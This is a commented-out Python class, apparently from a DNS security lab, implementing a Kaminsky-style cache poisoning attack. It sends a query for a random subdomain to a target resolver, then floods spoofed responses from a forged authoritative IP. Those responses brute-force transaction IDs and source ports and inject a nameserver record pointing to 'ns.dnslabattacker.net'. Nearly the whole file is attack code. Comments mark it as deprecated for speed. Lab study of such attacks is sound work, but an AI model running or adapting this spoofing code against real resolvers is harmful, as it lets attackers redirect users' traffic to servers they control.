# # # MainPoisonFlow

# class MainPoisonFlow:
#     def __init__(self, _target=None, _domain=None, _is_random=True, _port_scale=None, _is_port_need_shuffle=True, _authority_ip="199.234.32.33"):
#         """
#             Important Notice: 2020 / 9 / 11 该部分不满足速度要求, 已弃用
#             Important Notice: 2020 / 9 / 11 不再使用多线程,  
#         :param _target:
#         :param _domain:
#         :param _is_random:
#         :param _port_scale:
#         """
#         # # 随机时, 输入的端口号区间大小不得小于 1
#         assert _target is not None and _domain is not None and _port_scale is not None, "参数输入错误(10)"
#         if _is_random is True and len(_port_scale) > 1:
#             print("参数输入冲突(20)")
#         elif _is_random is False and len(_port_scale) != 1:
#             print("参数输入冲突(20)")
#         # # 不随机时, 输入的端口号区间大小不得不为 1
#         # assert , "参数输入冲突(30)"
#         # # 初始化 fail_flag, 该变量的值在每次线程阻塞前检测
#         self.fail_flag = False
#         # # 再次打乱区间
#         if _is_port_need_shuffle:
#             random.shuffle(_port_scale)
#         # # 端口号区间
#         self.port_seq = _port_scale
#         self.domain = _domain
#         self.target = _target
#         self.labels = [str(random.randint(100000, 999999)) + "-" + str(time.time()).replace(".", "-")] + _domain.split(
#             ".")
#         # # message_id (TX _ID,)区间
#         self.message_id_seq = list(range(0, 65536))
#         self.authority_ip = _authority_ip
#         random.shuffle(self.message_id_seq)

#     def send_and_recv_thread(self, _query: bytes):
#         _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         _sock.sendto(_query, (self.target, 53))
#         # _res, _ = _sock.recvfrom(8192)
#         # _response = DNSMessage(RESPONSE)
#         # _response.parse(_res)
#         # _sock.close()
#         # for _k, _v in vars(_response).items():
#         #     print(_k, _v)
#         # self.fail_flag = True
#         # print("攻击失败, 响应已从缓存服务器返回")

#     def poison_thread(self, _base_response: bytes):
#         _pkt = Ether()/IP(dst=self.target, src=self.authority_ip) / UDP(dport=33333, sport=53) / DNS(_base_response)
#         _b = _pkt.build()
#         raw_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
#         raw_socket.bind(("ens160", 0))
#         # _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         # _sock.bind(("10.245.146.73", 53))
#         for _p in self.port_seq:
#             for _id in self.message_id_seq:
#                 _new_dns_message = int(_id).to_bytes(2, 'big') + _b[44:]
#                 _b = _b[:40] + calc_udp_checksum(_src=self.authority_ip, _dst=self.target, _sport=53, _dport=_p, _payload=_new_dns_message) + _new_dns_message
#                 # _b = int(_id).to_bytes(2, 'big') + _base_response[2:]
#                 # _sock.sendto(_b, (self.target, 33333))
#                 raw_socket.send(_b)
#                 if self.fail_flag:
#                     return
#         print("Sent OK")

#     def flow(self):
#         """
#             1. 发送一个 query 并使其等待, 如果在返回攻击结束之前返回了, 则攻击失败
#             2. 发回若干 response 由于socket必须 bind((.., 53)) 因此无阻塞的情形下 乱并发没有意义, 可用协程
#             3. 可用一个队列, 将计算的部分给到其他编译型语言
#             4. 还有一件事, 为啥不提前准备响应包
#             5. 2020 / 9 / 11 该部分不满足速度要求, 已弃用
#         :return:
#         """
#         # # 参数
#         while True:
#             self.labels = [str(random.randint(100000, 999999)) + "-" + str(time.time()).replace(".", "-")] + self.domain.split(
#             ".")
#             _dns_query_message = DNSMessage(_type=QUERY)
#             _dns_response_message = DNSMessage(_type=RESPONSE)
#             _dns_query_message.message_id = random.randint(0, 0xffff)
#             _dns_query_message.set_numbers(_flags=0x0100, _question_rrs=1, _answers_rrs=0, _auth_rrs=0, _addi_rrs=0,
#                                         _query={
#                                             'labels': self.labels,
#                                             'type': 1,
#                                             'class': 1
#                                         })
#             # # 8100 -》 8400
#             _dns_response_message.set_numbers(_flags=0x8400, _question_rrs=1, _answers_rrs=1, _auth_rrs=1, _addi_rrs=1,
#                                             _query={
#                                                 'labels': self.labels,
#                                                 'type': 1,
#                                                 'class': 1
#                                             })
#             _dns_response_message.answers.append({
#                 'name': '.'.join(self.labels),
#                 'type': 1,
#                 'class': 1,
#                 "ttl": 208,
#                 "data_length": 4,
#                 "address": "1.1.1.1"
#             })
#             _dns_response_message.authoritative_nameservers.append({
#                 'name': self.domain,
#                 "type": 2,
#                 "class": 1,
#                 "ttl": 208,
#                 "data_length": 4,
#                 "address": "ns.dnslabattacker.net"
#             })
#             _dns_response_message.additional_records.append({
#                 'name': "ns.dnslabattacker.net",
#                 "type": 1,
#                 "class": 1,
#                 "ttl": 208,
#                 "data_length": 4,
#                 "address": "1.1.1.1"
#             })
#             _query_bytes = _dns_query_message.to_bytes()
#             _response_bytes = _dns_response_message.to_bytes()
#             self.send_and_recv_thread(_query_bytes)
#             self.poison_thread(_response_bytes)
#             # # 线程
#             # self.send_and_recv_thread(_query_bytes)
#             # _send_and_recv_thread = threading.Thread(
#             #     target=self.send_and_recv_thread, args=(_query_bytes,))
#             # _poison_thread = threading.Thread(
#             #     target=self.poison_thread, args=(_response_bytes,))
#             # # _threads = []
#             # # _threads = [_send_and_recv_thread]
#             # # _threads = [_poison_thread]
#             # _threads = [_send_and_recv_thread, _poison_thread]
#             # for _t in _threads:
#             #     _t.start()
#             # for _t in _threads:
#             #     _t.join()
#             print("OK", self.labels)